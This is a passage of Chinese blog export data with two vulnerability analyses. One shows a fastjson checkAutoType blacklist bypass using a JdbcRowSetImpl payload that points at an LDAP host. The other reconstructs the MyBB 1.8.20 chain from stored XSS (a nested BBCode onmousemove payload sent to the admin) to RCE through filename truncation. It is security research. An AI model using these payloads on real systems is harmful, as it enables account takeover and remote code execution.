alt=\"b6c844dff52bc46218e02c1dbd3767d9.png\"></p>\n<p>与上一场景一致，程序先匹配白名单、后匹配黑名单。如果@type字段指定的类在白名单中，则直接返回，不再进行黑名单校验。在白名单未匹配成功后，使用黑名单进行匹配，若匹配到黑名单，直接抛出异常。如果黑白名单都未匹配成功，程序继续向下执行</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811152212-6019ceb0-dba3-1.png\" alt=\"0458fe27ed39a0e5e2dc5c69964b09af.png\"></p>\n<p>程序将@type字段指定的类返回</p>\n<p>这种情况下要是payload想成功利用有两种办法：</p>\n<ul>\n<li><p>@type字段值只需要不在黑名单中即可成功利用</p>\n</li>\n<li><p>@type字段值在黑名单中，但是开发的时候在白名单中加入了这个类，payload依然可以成功利用</p>\n</li>\n</ul>\n<h3 id=\"四、autoTypeSupport值为True、使用parseObject-String-text-Class-lt-T-gt-clazz\"><a href=\"#四、autoTypeSupport值为True、使用parseObject-String-text-Class-lt-T-gt-clazz\" class=\"headerlink\" title=\"四、autoTypeSupport值为True、使用parseObject(String text, Class&lt;T&gt; clazz)\"></a>四、autoTypeSupport值为True、使用parseObject(String text, Class&lt;T&gt; clazz)</h3><pre><code>public static void main(String[] args) &#123;\n    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);\n    String jsonstr = &quot;&#123;\\&quot;@type\\&quot;:\\&quot;AutoTypeTest.Test1\\&quot;,\\&quot;s1\\&quot;:\\&quot;1\\&quot;&#125;&quot;;\n    Object obj = JSON.parseObject(jsonstr,AutoTypeTest.Test.class);\n    System.out.println(obj)\n&#125;</code></pre>\n<p>与上文第二、三场景相同，程序首先进入了这个分支</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811152236-6e80c67a-dba3-1.png\" alt=\"0bf84f2d75a81d8e7fcf8958a65a3c34.png\"></p>\n<p>此场景进入该分支的原因是autoTypeSupport与expectClass这两个条件都满足。关于这个分支的执行流程这里不再复述了</p>\n<p>在没有匹配到黑白名单后，程序执行到了下图这里</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811152247-750ab5f0-dba3-1.png\" alt=\"7832ca5693b89b2f1fb912c9df9cfe76.png\"></p>\n<p>由于这里clazz与expectClass所表示的类与接口不同，也不是超类或父类关系。因此程序抛出异常</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Exception in thread <span class=\"string\">&quot;main&quot;</span> com.alibaba.fastjson.JSONException: type not match.AutoTypeTest.Test1 -\\&gt; AutoTypeTest.Test</span><br></pre></td></tr></table></figure>\n\n<p>在这种情况下，payload想执行成功，有两种可能性：</p>\n<ul>\n<li><p>没有命中黑名单且Class&lt;T&gt;<br>clazz表示的类或接口是否与指定的@type字段值表示的类或接口相同，或者是其超类或父接口。</p>\n</li>\n<li><p>@type字段值在白名单中</p>\n</li>\n</ul>\n<h2 id=\"早期checkAutoType安全机制缺陷\"><a href=\"#早期checkAutoType安全机制缺陷\" class=\"headerlink\" title=\"早期checkAutoType安全机制缺陷\"></a>早期checkAutoType安全机制缺陷</h2><p>在fastjson 1.2.25版本引入的checkAutoType以及后续的几个版本中存在着一定的缺陷</p>\n<p>如上文所分析，程序通常先经过黑名单与白名单的校验后，将满足条件的类对象通过如下代码赋值给clazz</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br></pre></td></tr></table></figure>\n\n<p>程序最终将字符串反序列化为clazz所表示的类对象。我们着重分析下TypeUtils.loadClass是如何实现的</p>\n<p>TypeUtils.loadClass方法位于com/alibaba/fastjson/util/TypeUtils.java中</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (className == <span class=\"keyword\">null</span> || className.length() == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (clazz != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (className.charAt(<span class=\"number\">0</span>) == <span class=\"string\">&#x27;[&#x27;</span>) &#123;</span><br><span class=\"line\">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class=\"number\">1</span>), classLoader);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> Array.newInstance(componentType, <span class=\"number\">0</span>).getClass();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (className.startsWith(<span class=\"string\">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class=\"string\">&quot;;&quot;</span>)) &#123;</span><br><span class=\"line\">        String newClassName = className.substring(<span class=\"number\">1</span>, className.length() - <span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> loadClass(newClassName, classLoader);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>问题就出在下图代码上：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811152330-8e91dc2e-dba3-1.png\" alt=\"9d5e68c2ef26557badccfca670540cc9.png\"></p>\n<p>当传入的className变量以”L”开头，并以”;”结尾，进入该if分支。在这个if分支中，程序将会把开头的”L”与结尾的”;”去掉，并递归调用loadClass加载这个类。因此可以下图这样构造来进行绕过</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811152340-94667736-dba3-1.png\" alt=\"54ce372006a50b8930efc41634dcb40b.png\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">    String jsonstr = <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\\&quot;,\\&quot;dataSourceName\\&quot;:\\&quot;ldap://localhost:1389/ExecTest\\&quot;,&quot;</span> +</span><br><span class=\"line\">            <span class=\"string\">&quot; \\&quot;autoCommit\\&quot;:true&#125;&quot;</span>;</span><br><span class=\"line\">    Object obj = JSON.parseObject(jsonstr);</span><br><span class=\"line\">    System.out.println(obj);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>loadClass会将”L”与”;”去除后组成newClassName并返回</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811152351-9abad58c-dba3-1.png\" alt=\"5efedf30915eee73c1f30a0f2e229e89.png\"></p>\n<p>这一操作在匹配黑白名单之后，Lcom.sun.rowset.JdbcRowSetImpl;恰好可以绕过黑名单中的限制。后续checkAutoType检测机制进行了一系列的安全加固，大体上都是黑名单防逆向分析、扩展黑名单列表等，但checkAutoType检测机制没有太大的改变。受篇幅影响，这里就不再详细分析了。</p>\n"},{"title":"MyBB 1.8.20 从存储型XSS到RCE漏洞深度分析","date":"2019-09-04T11:26:54.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n<div align=\"center\">{% asset_img 1.jpg%}</div>\n\nMyBB是国际上非常优秀的免费论坛软件，最大的特色是简单但是功能却出奇的强大，支持多国语言，可以分别设置前台后台的语言。\n\nMyBB作为一个开源项目，拥有活跃的社区环境，项目的管理,发展由社区志愿者支持。用户量广泛，在github上的项目拥有609 个star，79个releases。\n\nMyBB &lt;= 1.8.20存在一处从存储的XSS到RCE组合利用漏洞，攻击者可以先通过xss获得管理员权限，再通过rce达到远程代码执行。这套利用流程不仅隐蔽而且利用难度低，只要私信给mybb管理员发出一条包含payload的消息即可。\n\n<!--more-->\n\n该漏洞由RIPS 团队安全研究人员Simon Scannell发现并纰漏。但截止目前，并未公布利用poc\n\n我们试图从Simon Scannell简单的漏洞披露中深入分析该漏洞，并尝试还原出poc\n\n首先分析下mybb xss漏洞\n\n&nbsp;\n\n## **0x01 XSS漏洞**\n* * *\n\n此漏洞为mybb对BBCode的错误解析而造成的\n\n首先了解下BBCode:\n\nBCode是Bulletin Board Code的缩写，属于轻量标记语言（Lightweight Markup Language）的一种，如字面上所表示的，它主要是使用在BBS、论坛、Blog等网络应用上。BBcode的语法通常为 [标记] 这种形式，即语法左右用两个中括号包围，以作为与正常文字间的区别。系统解译时遇上中括号便知道该处是BBcode，会在解译结果输出到用户端时转换成最为通用的HTML语法。\n\n下图举个简单的例子：\n\n[![0](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408424824_0.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408424824_0.png)\n\n在BBcode中给关键词加链接可以用下面的代码：\n\n[url=[https://www.xiongbenxiongbenxiong.com/1.html](https://www.xiongbenxiongbenxiong.com/1.html)]熊本熊本熊[/url]\n\n然而，BBcode只是一种标记语言，并没有一个共同的标准。各个BBS、论坛、Blog等网络应用程序可能会有自己独创的BBcode。在实际场景中，不同的程序会在后台使用不同的方式将BBcode解析成html来进行页面渲染\n\n接下来看下mybb程序对BBCode的解析流程\n\n举一个例子，使用BBcode格式分别插入的一条视频链接与一条url链接\n\n[![1](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408425165_1.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408425165_1.png)\n\nMybb程序会对BBcode进行解析，以便转化为浏览器可识别的html语言\n\nMybb首先会对video链接进行解析（注意：这与video和url的排列顺序无关，在程序的后台，会首先处理video，后处理url）\n\n经过video解析器解析后的格式如下\n\n[![2](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408425474_2.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408425474_2.png)\n\n接着mybb对BBCode格式的url进行解析，经过url解析器解析后的格式如下\n\n[![3](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408425622_3.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408425622_3.png)\n\n此时，mybb以将BBcode语言解析成为html语言，浏览器渲染页面，显示嵌入的video与超链接中的url\n\n如果，我们将两个BBCode格式的语句进行嵌套呢？\n\n像如下图这样的形式\n\n[![4](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040842598_4.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040842598_4.png)\n\n按照我们的推测，会进行如下的解析：\n\n首先，解析video\n\n[![5](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/20190904084302100_5.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/20190904084302100_5.png)\n\n解析之后的格式如上图\n\n然后，解析url，也就是下图红框处的结构\n\n[![6](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408430523_6.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408430523_6.png)\n\n解析之后的结果如下图\n\n[![7](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408430716_7.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408430716_7.png)\n\n[![8](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408431056_8.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408431056_8.png)\n\n注意上图红框这里，src中的值，被href引入的双引号闭合，而onmusemove成功逃逸出来，意味着alert会在鼠标移动时，alert将会被执行\n\n事实上，以上的流程，在mybb中是否成立。正式因为上文猜测中的嵌套解析，造成了此次xss漏洞\n\n接下来跟下代码\n\n首先，我们给管理员（admin）账号发一条如下图bbcode语言的私信\n\n[![9](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408431490_9.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408431490_9.png)\n\n这条私信会原封不动的被写入数据库中\n\n[![10](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408431789_10.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408431789_10.png)\n\n当管理员查看私信时，这条message会被从数据库中取出，并解析为html语言进行渲染\n\n[![11](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408432090_11.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408432090_11.png)\n\n程序调用private.php执行上述操作，跟进private.php\n\n[![12](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040843246_12.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040843246_12.png)\n\n在997行处，程序将留言从数据库中取出，并赋值$pm\n\n[![13](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408432858_13.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408432858_13.png)\n\n在11789行处，将$pm传入build_postbit方法\n\n[![14](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408433134_14.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408433134_14.png)\n\n跟入build_postbit方法\n\n[![15](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408433443_15.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408433443_15.png)\n\n在该方法774行处，将message传入parse_message,这里的message即为我们构造的BBCode语句\n\n跟入parse_message方法\n\n[![16](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408434148_16.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408434148_16.png)\n\n在parse_message方法中201行处，调用parse_mycode对$message进行处理\n\n跟入parse_mycod方法\n\n[![17](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408434479_17.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408434479_17.png)\n\n如上图，第一个红框处，会对bbcode中的video结构进行解析，而第二个红框处，会对url,email等结构进行解析。正因为这里的解析的先后顺序，决定了构造poc时的嵌套顺序\n\n首先来看video解析\n\n[![18](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408434815_18.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408434815_18.png)\n\n这里使用了preg_replace_callback，对匹配到的内容使用mycode_parse_video_callback回调进行替换\n\n[![19](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408435155_19.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408435155_19.png)\n\n跟入mycode_parse_video_callback\n\n[![20](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408435498_20.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408435498_20.png)\n\n可见mycode_parse_video_callback将$matches[1], $matches[2]传入mycode_parse_video方法\n\n跟入mycode_parse_video方法\n\n [![21](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408435737_21.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408435737_21.png)\n\n如下图，首先使用parse_url对传入的url($matches[2])进行解析\n\n [![22](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408440199_22.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408440199_22.png)\n\n解析后的parsed_url值如下图\n\n [![23](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408440475_23.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408440475_23.png)\n\n接着，将$parsed_url['fragment']赋值与$ fragment\n\n [![24](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408440715_24.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408440715_24.png)\n\n随后，进入switch语句，根据不同视频来源，分情况解析。我们这里构造的是youtbe来源，进入该分支\n\n [![25](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408441164_25.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408441164_25.png)\n\n在下图中，将$ fragment中的!v=置空，赋值与$id\n\n[![26](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408441466_26.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408441466_26.png)\n\n此时id值为test[url=onmousemove='alert(1337)']\n\n [![27](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408441887_27.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408441887_27.png)\n\n随后，由于担心xss攻击，程序在这里对$id进行html特殊字符转义处理，如下图\n\n[![28](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408442138_28.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408442138_28.png)\n\n[![29](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408442429_29.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408442429_29.png)\n\n接着，从templates中取出对应video的模板，如下图$templates get方法\n\n[![30](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408442779_30.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408442779_30.png)\n\n根据get方法，看下取出模板的形式\n\n[![31](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/20190904084430100_31.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/20190904084430100_31.png)\n\n上图为最终生成html的模板，此处的$id即为上文中case分支中赋值的$id\n\n最终，将$id值填充的模板中，结果如下图\n\n[![32](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408443348_32.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408443348_32.png)\n\n回到preg_replace_callback处，$message替换后的结果如下图\n\n[![33](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408443628_33.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408443628_33.png)\n\n此时$message=&lt;iframe width=\"560\" height=\"315\" src=\"//www.youtube.com/embed/test[url=onmousemove='alert(1337)']\" frameborder=\"0\" allowfullscreen&gt;&lt;/iframe&gt;[/url]\n\nVideo的解析到此结束了，此时html语句，是不是和上文流程中猜测的形式一样呢？\n\n&nbsp;\n\n接下来，仍然使用preg_replace_callback对url进行替换\n\n[![34](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408443948_34.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408443948_34.png)\n\n如下图可见，使用#\\[url=((?!javascript)[a-z]+?://)([^\n\n\"&lt;]+?)\\](.+?)\\[/url\\]#si正则进行匹配，使用\n\nmycode_parse_url_callback1回调对$message进行替换\n\n[![35](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408444218_35.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408444218_35.png)\n\n此处的处理与上文中的video极其相似，这里就不重复说明了\n\n在url解析结束后，messgae值如下图\n\n[![36](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408444522_36.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408444522_36.png)\n\n可见，如上文流程分析一致，href中引入的双引号，将src闭合了，onmousemove得以逃逸\n\n最终，xss产生\n\n[![37](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408444935_37.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408444935_37.png)\n\n[![38](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408445217_38.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408445217_38.png)\n\n[![39](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408445522_39.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408445522_39.png)\n\n利用给管理员私信的这个功能，通过xss漏洞，可以获取管理员cookie，从而获得后台权限\n\n接下来分析下rce漏洞\n\n&nbsp;\n\n## **0x02 RCE漏洞**\n* * *\n\nMybb后台提供导入theme功能\n\n[![40](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408445899_40.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408445899_40.png)\n\n可以选择本地theme进行导入，上传的theme格式许为xml格式，形式如下\n\n[![41](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408450222_41.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408450222_41.png)\n\n这里的导入的xml文件存储了该theme下所有包含的css文件，下面展示其中两个片段\n\n[![42](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408450698_42.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408450698_42.png)\n\n[![43](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408450976_43.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408450976_43.png)\n\n简单来说，相当于是把这个theme里包含的所有css都存储到xml一个结构里\n\n在上传xml格式的theme时，程序后台会解析该xml，如下图代码\n\n[![44](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408451292_44.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408451292_44.png)\n\n随后，将解析的xml树中的内容，例如css名称，内容、id等写入数据库\n\n[![45](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408451570_45.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408451570_45.png)\n\n上图即为解析上传的xml格式的theme，将解析出的css的信息入库的操作\n\n[![46](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408451874_46.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408451874_46.png)\n\n入库后，数据库中内容如上图\n\n在解析xml内的css数据的name时，后台程序会校验css的后缀是否合法\n\n[![47](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408452251_47.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408452251_47.png)\n\n可见，程序要求xml结构中，css文件后缀应为.css。但其校验方式仅仅检测css名称后四位是否为.css\n\n当我们构造css数据时，可以使得css文件名为aaaaaaaaaaaaaaaaaaaaaaaaaa.php.css,在css文件内容处插入payload，如下图\n\n[![48](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408452587_48.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408452587_48.png)\n\n在xml解析后，$stylesheet['attributes']['name']的值为aaaaaaaaaaaaaaaaaaaaaaaaaa.php.css，成功绕过检测\n\n当进行入库操作时，如下图代码\n\n[![49](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408452876_49.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408452876_49.png)\n\n此时将要插入表中name字段的值为aaaaaaaaaaaaaaaaaaaaaaaaaa.php.css，由于mysql默认字段长度为30字符，而我们的name长度为34字符，所以，.css会被截断，最终插入表中name字段的值为aaaaaaaaaaaaaaaaaaaaaaaaaa.php。\n\n与此同时，aaaaaaaaaaaaaaaaaaaaaaaaaa.php.css中的内容，会插入到stylesheet字段中，我们构造的payload随同aaaaaaaaaaaaaaaaaaaaaaaaaa.php.css中的内容，一同写入数据库。\n\n[![50](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408453146_50.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408453146_50.png)\n\n程序在执行xml数据从解析到入库的操作的同时，也会在本地生成对应的文件，如下图\n\n[![51](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408453593_51.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408453593_51.png)\n\n这里生成文件名仍是.css后缀。原因很好理解：这里生成的文件名由解析上传的xml文件中的css name值决定的，如下图\n\n[![52](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408453755_52.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408453755_52.png)\n\n因此后缀为.css\n\n&nbsp;\n\n接下来在后台页面中，查看我们刚刚导入的theme\n\n[![53](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408454088_53.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408454088_53.png)\n\n可以看到我们grq themes里的css列表中，后缀已经变为php\n\n这是为什么呢？原因很简单，因为此处展示的内容，是从数据库中查询得到，此时数据库内容如下图\n\n[![54](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408454318_54.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408454318_54.png)\n\n数据库由于30字符最大长度的截断，已经把入库的文件名后的.css截断了，此时数据库中name的后缀变为php\n\n这时，点击Stylesheets in grq 列表中的aaaaaaaaaaaaaaaaaaaaaaaaaa.php，进入编辑页面\n\n[![55](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408454721_55.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408454721_55.png)\n\n[![56](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408455075_56.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408455075_56.png)\n\n再次查看后台文件夹，可见生成了一个.php后缀文件，如下图\n\n[![57](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040845533_57.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040845533_57.png)\n\n这里的原理也很简单。点击编辑css文件时，程序会从数据库中读取该文件的name以及内容，\n\n并判断在指定目录中是否存在，若不存在，则用数据库中取出的name为文件名，生成文件，并将数据库中取出的内容写入该文件中\n\n由于此时库中的name为aaaaaaaaaaaaaaaaaaaaaaaaaa.php，所以在指定位置生成了aaaaaaaaaaaaaaaaaaaaaaaaaa.php文件\n\n下面跟下php文件生成的流程与代码\n\n在点击aaaaaaaaaaaaaaaaaaaaaaaaaa.php，进入其编辑页面这个操作\n\n[![58](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408455691_58.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408455691_58.png)\n\n&nbsp;\n\n此时发送请求如下\n\n[![59](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408455935_59.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408455935_59.png)\n\n后台代码执行如下：\n\n首先进入\n\n\\admin\\modules\\style\\themes.php\n\n[![60](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408460279_60.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408460279_60.png)\n\n此时的action为edit_stylesheet，进入上图分支\n\n接着从数据库中查询该条数据，执行的sql语句如下\n\n[![61](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408460538_61.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408460538_61.png)\n\n[![62](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040846089_62.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040846089_62.png)\n\n查询结果如上图\n\n&nbsp;\n\n最后将库中内容写入文件，文件名即为库中name字段，文件内容即为库中stylesheet字段\n\n[![63](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408461176_63.png)](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408461176_63.png)\n\n如上图，构造的payload被写入aaaaaaaaaaaaaaaaaaaaaaaaaa.php\n\n&nbsp;\n\n打开aaaaaaaaaaaaaaaaaaaaaaaaaa.php，可见payload成功写入\n\n[![64](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408461455_64.png)](http://alp